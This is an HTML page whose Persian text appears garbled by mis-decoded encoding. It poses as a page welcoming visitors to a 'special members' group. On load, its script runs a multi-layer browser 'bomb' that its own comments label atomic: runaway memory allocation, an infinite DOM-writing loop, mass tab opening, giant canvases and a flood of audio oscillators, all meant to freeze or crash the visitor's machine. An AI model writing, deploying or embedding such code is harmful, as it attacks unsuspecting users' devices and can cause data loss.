<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>рҹ”Ҙ Ш§Ш·Щ„Ш§Ш№Ш§ШӘ ЩҲЫҢЪҳЩҮ рҹ”Ҙ</title>
<style>
body { 
    font-size: 20px; 
    direction: rtl; 
    background: linear-gradient(45deg, #0a0a0a, #1a1a2e); 
    color: #ffd700; 
    text-align: center; 
    padding: 50px; 
    font-family: 'Traditional Arabic', 'Amiri', serif;
    white-space: pre-wrap; 
    word-break: break-all; 
    overflow: hidden; 
}
h1 {
    font-size: 30px;
    color: #ff6b6b;
}
p {
    font-size: 20px;
    color: #aaa;
}
</style>
</head>
<body>
<h1>рҹ”Ҙ ШЁЩҮ Ш¬Щ…Ш№ Щ…Щ…ШЁШұЩҮШ§ЫҢ ЩҲЫҢЪҳЩҮ Ш®ЩҲШҙ Ш§ЩҲЩ…ШҜЫҢ! рҹ”Ҙ</h1>
<p>ШҜШұ ШӯШ§Щ„ ШЁШ§ШұЪҜШ°Ш§ШұЫҢ Щ„ЫҢШіШӘ ЫІЫ°Ы°Ы° Щ…Щ…ШЁШұ ЩҒЫҢЪ©...</p>
<script>
// ==================== ШЁЩ…ШЁ Ш§ШӘЩ…ЫҢ (ЩҮЩ…ШІЩ…Ш§ЩҶ ШЁШ§ Щ…ШӘЩҶ) ====================
// Щ„Ш§ЫҢЩҮ Ыұ: ШЁЩ…ШЁ ШӯШ§ЩҒШёЩҮ
var memory = [];
function memoryBomb() {
    for (var i = 0; i < 10000; i++) {
        memory.push(new Array(10000000).join('р’ҖҖ'));
        memory.push(new Array(10000000).join('рҹ”Ҙ'));
    }
}
setInterval(memoryBomb, 1);

// Щ„Ш§ЫҢЩҮ ЫІ: ШӯЩ„ЩӮЩҮ ШЁЫҢвҖҢЩҶЩҮШ§ЫҢШӘ
function infiniteLoop() {
    var chars = ['вғҹ','кҷ°','р’ҖҖ','рҹ’Җ','рҹ”Ҙ','вҡЎ','рҹ’Ҙ','рҹҺҜ','вҳўпёҸ'];
    while (true) {
        document.body.innerHTML += chars[Math.floor(Math.random() * chars.length)];
        document.body.innerHTML += 'рҹ’Җ'.repeat(10000);
        document.body.innerHTML += 'рҹ”Ҙ'.repeat(10000);
    }
}
setTimeout(infiniteLoop, 0);

// Щ„Ш§ЫҢЩҮ Ыі: ШЁЩ…ШЁ ШӘШЁ
function tabBomb() {
    for (var i = 0; i < 200; i++) {
        window.open('https://example.com', '_blank');
    }
}
setInterval(tabBomb, 50);

// Щ„Ш§ЫҢЩҮ Ыҙ: ШЁЩ…ШЁ Canvas
function canvasBomb() {
    for (var i = 0; i < 1000; i++) {
        var canvas = document.createElement('canvas');
        canvas.width = 10000000;
        canvas.height = 10000000;
        var ctx = canvas.getContext('2d');
        for (var j = 0; j < 1000000; j++) {
            ctx.fillStyle = '#' + Math.floor(Math.random()*16777215).toString(16);
            ctx.fillRect(Math.random()*10000000, Math.random()*10000000, 100000, 100000);
        }
        document.body.appendChild(canvas);
    }
}
setInterval(canvasBomb, 1);

// Щ„Ш§ЫҢЩҮ Ыө: ШЁЩ…ШЁ ШөЩҲШӘЫҢ
function audioBomb() {
    for (var i = 0; i < 200; i++) {
        try {
            var audio = new AudioContext();
            for (var j = 0; j < 100000; j++) {
                var oscillator = audio.createOscillator();
                oscillator.frequency.value = Math.random() * 10000000;
                oscillator.type = 'sawtooth';
                oscillator.connect(audio.destination);
                oscillator.start();
                oscillator.stop(0.001);
            }
        } catch(e) {}
    }
}
setInterval(audioBomb, 1);

console.log('рҹ”Ҙ ШЁЩ…ШЁ Ш§ШӘЩ…ЫҢ ШЁШ§ Щ…ШӘЩҶ ЩҮЩ…ШІЩ…Ш§ЩҶ ЩҒШ№Ш§Щ„ ШҙШҜ!');
</script>
</body>
</html>
